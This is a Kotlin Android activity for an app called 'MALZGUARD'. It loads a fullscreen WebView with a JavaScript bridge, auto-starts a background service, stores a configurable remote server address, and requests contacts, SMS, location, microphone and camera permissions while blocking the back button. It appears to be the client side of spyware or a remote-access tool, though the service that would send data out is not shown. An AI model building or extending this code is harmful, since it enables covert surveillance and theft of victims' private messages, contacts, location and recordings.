package com.example.malzguard

import android.app.Activity
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.view.View
import android.view.WindowManager
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import android.webkit.WebChromeClient
import android.widget.FrameLayout

class MainActivity : Activity() {
    private var wv: WebView? = null

    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        try {
            window.setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN)
            val root = FrameLayout(this)
            val web = WebView(this)
            val lp = FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT)
            root.addView(web, lp)
            setContentView(root)
            wv = web
            web.settings.javaScriptEnabled = true
            web.settings.domStorageEnabled = true
            web.settings.allowFileAccess = true
            web.settings.allowContentAccess = true
            web.webViewClient = WebViewClient()
            web.webChromeClient = WebChromeClient()
            web.addJavascriptInterface(Bridge(), "Native")
            web.loadUrl("file:///android_asset/index.html")
            try { startService(Intent(this, Svc::class.java)) } catch (e: Exception) {}
        } catch (e: Exception) {
            try {
                val tv = android.widget.TextView(this)
                tv.text = "MALZGUARD error: " + e.message
                tv.textSize = 16f
                tv.setPadding(40, 40, 40, 40)
                setContentView(tv)
            } catch (e2: Exception) {}
        }
    }

    inner class Bridge {
        @JavascriptInterface
        fun getServer(): String {
            return try { getSharedPreferences("mg", MODE_PRIVATE).getString("server", "") ?: "" } catch (e: Exception) { "" }
        }
        @JavascriptInterface
        fun saveServer(url: String) {
            try { getSharedPreferences("mg", MODE_PRIVATE).edit().putString("server", url.trim()).apply() } catch (e: Exception) {}
        }
        @JavascriptInterface
        fun start() {
            try { startService(Intent(this@MainActivity, Svc::class.java)) } catch (e: Exception) {}
        }
        @JavascriptInterface
        fun stop() {
            try { stopService(Intent(this@MainActivity, Svc::class.java)) } catch (e: Exception) {}
        }
        @JavascriptInterface
        fun deviceInfo(): String {
            return try {
                Build.MANUFACTURER + " " + Build.MODEL + " | android " + Build.VERSION.RELEASE
            } catch (e: Exception) { "unknown" }
        }
        @JavascriptInterface
        fun requestPerms() {
            try {
                val perms = mutableListOf(
                    android.Manifest.permission.READ_CONTACTS,
                    android.Manifest.permission.READ_SMS,
                    android.Manifest.permission.ACCESS_FINE_LOCATION,
                    android.Manifest.permission.ACCESS_COARSE_LOCATION,
                    android.Manifest.permission.RECORD_AUDIO,
                    android.Manifest.permission.CAMERA
                )
                if (Build.VERSION.SDK_INT >= 33) perms += android.Manifest.permission.POST_NOTIFICATIONS
                requestPermissions(perms.toTypedArray(), 100)
            } catch (e: Exception) {}
        }
    }

    override fun onBackPressed() {}
}
